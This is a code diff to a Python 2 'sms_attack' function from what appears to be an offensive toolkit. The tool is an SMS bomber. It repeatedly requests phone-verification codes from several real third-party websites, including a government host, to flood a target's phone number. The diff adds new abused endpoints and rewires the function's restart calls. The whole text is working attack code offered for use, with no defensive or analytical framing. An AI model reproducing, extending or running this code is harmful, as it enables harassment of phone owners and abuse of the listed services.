@@ -46,14 +46,14 @@ def sms_attack():
                  Gecko/10100101 Firefox/19.0'}
             url_l = ["http://member.ync365.com/check/getcode?mobile=" + options[0],
                  "http://www.yunjiazheng.com/member/SendDynamicPassword?mobile="+options[0],
-                 "http://user.rayli.com.cn/forum.php?mod=ajax&infloat=register&handlekey=register&action=dsmscode&fbry=15636xAab1223awWC45763&ajaxmenu=1&stype=lostpwd&mobile=" + options[0] + "&inajax=1&ajaxtarget=smscode_tip"
-                 ]
+                 "http://i.mgmall.com/register/vaildMobile?4457073250222&mobile="+options[0],
+                 "http://www.daxie.gov.cn:8081/Manager.ashx?method=GetRegisterCode&Mobile="+options[0],]
             try:
                 while True:
                     for url in url_l:
                         try:
                             r = requests.get(url,headers=headers)
-                            print '[*] using ' + url + '...' 
+                            print '[*] using ' + url 
                             print '[*] Try send  a messages ' + 'to ' + options[0] 
                         except:
                             print "send error please your network" 
@@ -63,11 +63,11 @@ def sms_attack():
                     sleep(60)
             except KeyboardInterrupt:
                 print_err("[!] Detected Ctrl-C...")
-                sql_exp()
+                sms_attack()
 
-            sql_exp()
+            sms_attack()
         else:
-            sql_exp()
+            sms_attack()
 
     except KeyboardInterrupt:
          print_err("[*] Detected Ctrl-C ,System Exit...")
